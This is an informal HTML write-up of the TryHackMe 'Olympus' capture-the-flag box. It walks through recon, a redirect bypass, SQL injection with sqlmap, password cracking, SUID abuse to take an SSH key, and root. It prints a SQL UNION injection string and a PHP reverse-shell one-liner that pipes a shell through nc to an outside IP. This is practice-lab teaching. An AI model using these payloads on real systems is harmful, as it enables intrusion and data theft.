        <div class = "center">
            <h1>THM Olympus Write-up</h1>
            <h2 id="passive_recon" class="normal">Recon Work ðŸ•µ:</h2>
            I'll be using rustscan <i>(again)</i> because my shitty wi-fi can't keep up with nmap and i get false reports 99% of the time or have to wait for 2 hours for a full port scan.<br>
            Looking at the results there's nothing special going on in here. Just a website and ssh.<br>
            <img src="https://i.imgur.com/kf7ubiY.png"><br>
            Let's check out the website.<br>
            The website refers to olympus.thm so I added olympus.thm inside my /etc/hosts file like this:<br>
            Remember my box's ip address might be different from yours. Don't just write what you see.<br>
            <img src="https://i.imgur.com/FtBiJYt.png"><br>
            Looks like the site is moved to somewhere else inside the same domain.<br>
            <img src="https://i.imgur.com/nQrzbRS.png", width="1000"><br>
            Let's enumerate directories.<br>
            I ran gobuster with serval wordlists over and over again and I discovered the old site was located in /~webmaster.<br>
            <img src="https://i.imgur.com/6xOWXEe.png"><br>
            I'll use feroxbuster with the same wordlist to enumerate the site even more.<br>
            It looks like there's an admin page on the website. But it refers us to index.html as soon as we enter it.<br>
            This is really shitty security since the site gives us a 301 response instead of blocking us by returning 403.<br>
            <img src="https://i.imgur.com/ek1U09z.png"><br>
            We can just access the admin panel and take a look around if we use burpsuite and edit the respone from 301 to 200 ok.<br>
            If you want to know more about Execute After Redirect vulnerabilities I reccomend you take a look at <a href="https://www.youtube.com/watch?v=LI9mw1rMKVw&t=390s">IppSec's Previse Write-up</a>.<br>
            <img src="https://i.imgur.com/Xfnsk4N.png"><br>
            <img src="https://i.imgur.com/zSsmEx9.png"><br>
            It looks like there's another domain called chat.olympus.thm<br>
            <img src="https://i.imgur.com/ZV7tcQk.png", width="1000"><br>
            I added it to my /etc/hosts file like I did before.<br>
            Let's look at it.<br>
            <img src="https://i.imgur.com/prPMIec.png", width="1000"><br>
            I found a bonus XSS vulnerability :P<br>
            <img src="https://i.imgur.com/OJ8MGy9.png"><br>
            <img src="https://i.imgur.com/SECcTiq.png"><br>
            <h2 id="foothold" class="normal">Foothold ðŸ¤®:</h2>
            I couldn't find a way to log in, so let's take a step back.<br>
            We know that the site is built with Victor CMS.<br>
            Looking at issues in Victor CMS's github repository it looks like the creator of this made a shitty job when it comes to security.<br>
            It also looks like he doesn't give a fuck about fixing it any time soon. ðŸ˜‚<br>
            <img src="https://i.imgur.com/OPLFsAu.png", width="1000"><br>
            Let's try #14!<br>
            We need to type "AAA' UNION SELECT 1, 2, (SELECT @@version), (SELECT user()), (SELECT database()),6,(SELECT system_user()),8,9,10 -- A" to test for the vulnerability.<br>
            <img src="https://i.imgur.com/FADOnAZ.png", width="1000"><br>
            The exploit didn't work but we got an error message, I ain't smart/stupid enough to read the source code and figure out an exploit on my own so I'm gonna use sqlmap.<br>
            Let's dump the databeses<br>
            <img src="https://i.imgur.com/YfHpN9a.png"><br>
            There's two interesting databeses named phpmyadmin and Olympus.<br>
            Let's dump tables for Olympus.<br>
            <img src="https://i.imgur.com/Z0xQh0J.png"><br>
            We have found our first flag! 1 out of 4 :(<br>
            <img src="https://i.imgur.com/VqRMXRn.png"><br>
            We also have a private chat?<br>
            <img src="https://i.imgur.com/TvnE8M1.png", width="1000"><br>
            This might be it!<br>
            oh no, idk what to at this point :((<br>
            <img src="https://i.imgur.com/eVji88c.png"><br>
            Sike, we can still crack the user's passwords <img src="https://c.tenor.com/UhCdzeu5Y_4AAAAd/trollface-troll.gif", width="20"><br>
            <img src="https://i.imgur.com/dyhsH3Z.png", width="1000"><br>
            Looking at the source code on Victor CMS, we can see that it uses password_hash to encrypt user passwords.<br>
            <img src="https://i.imgur.com/7KhKVM6.png"><br>
            I wrote a php brute forcer myself but it was slow as hell so I just ended up using hashcat with seclist's probable 1200 wordlist or idk I forgot the name.<br>
            <img src="https://i.imgur.com/7Gfoc2X.png"><br>
            <img src="https://i.imgur.com/bNR4wDS.png"><br>
            after running hashcat I could only find the password for the prometheus user.<br>
            <img src="https://i.imgur.com/VhgmH1Y.png"><br>
            Let's try loging into chat.olympus.thm and olympus.thm.<br>
            We're in. ðŸ•µ<br>
            <img src="https://i.imgur.com/b4zllNM.png", width="1000"><br>
            Hold up, when we discovered the private chat we could see the ACTUAL file name even though it was "made using special random name function". If we can upload a php shell we might be able to find and execute it.<br>
            SQLMap is a dumb as fuck so I had to manually remove my old output file for it to see new stuff.<br>
            <img src="https://i.imgur.com/bLknZhY.png"><br>
            <h2 id="user" class="normal">User ðŸ¥³:</h2>
            for anyone wondering this is the payload i'll be using:<br>
            <pre><code class="language-php">exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.18.63.50 90 >/tmp/f")</code></pre>
            Anyways lets get shell.<br>
            I'm in, again.<br>
            <img src="https://i.imgur.com/bLknZhY.png", width="1000"><br>
            we got anther flag inside zeus's home folder<br>
            <img src="https://i.imgur.com/LH2hGUe.png"><br>
            We need to get into zeus's frist account in order to priv esc.<br>
            I ran linpeas but nothing useful came out.<br>
            however I found out there was python3 on the box so I moved to an interactive shell because it's cooler or something idk<br>
            <img src="https://i.imgur.com/zkVMIGK.png"><br>
            we cant run sudo -l<br>
            let's check for perms we have using this command:<br>
            <pre><code class="language-bash">find / -perm -u=s -type f 2>/dev/null</code></pre>
            <img src="https://i.imgur.com/YCDIyJk.png"><br>
            I searched for cputils online and nothing came up, maybe this is a special tool?<br>
            looks like we can copy files using it.<br>
            <img src="https://i.imgur.com/NB0Bf0B.png"><br>
            Let's investigate more.<br>
            We can run this file privilaged as zeus.<br>
            <img src="https://i.imgur.com/xAEZfvN.png"><br>
            We know that this box has port 22 open and zeus has a directory called .ssh so let's get zeus's id_rsa private key.<br>
            <img src="https://i.imgur.com/Smp82TH.png"><br>
            It needs a passphrase. (I'm so done with this box.)<br>
            <img src="https://i.imgur.com/stP7D7Q.png"><br>
            damn it let's use ssh2john.<br>
            <img src="https://i.imgur.com/Tj0VhBG.png"><br>
            <img src="https://i.imgur.com/vnqAEZw.png"><br>
            we got the passphrase. <img src="https://c.tenor.com/u9aJKcYcQpgAAAAi/pog-champ.gif", width="20"><br>
            <img src="https://i.imgur.com/oKfrtTD.png"><br>
            <h2 id="root" class="normal">Root ðŸ˜Ž:</h2>
            Ayo, wtf???<br>
            <img src="https://i.imgur.com/UUk9Orv.png", width="1000"><br>
            We're not root so we can't run nc<br>
            <img src="https://i.imgur.com/OnWsIJD.png"><br>
            This is how we get privilaged??<br>
            <img src="https://i.imgur.com/VbMM3f5.png"><br>
            we can just run this at our normal shell :/<br>
            bruh ðŸ’€<br>
            finnaly :o<br>
            <img src="https://i.imgur.com/zTIcP24.png"><br>
            we have a note:<br>
            <pre><code class="console">PS : Prometheus left a hidden flag, try and find it ! I recommend logging as root over ssh to look for it ;)</code></pre>
            I got an interactive shell again using python.<br>
            maybe this will work?? :p<br>
            <pre><code class="language-bash">grep -r flag{ /</code></pre>
            This took forever to run.<br>
            <img src="https://i.imgur.com/yDFfUH8.png", width="1000"><br>
            <h2 id="analysis" class="normal">Analysis ðŸ¤“:</h2>
            This was one of the most fun boxes I've ever done.<br>
            It was just perfect, I guess I like getting 4 flags instead of 2.
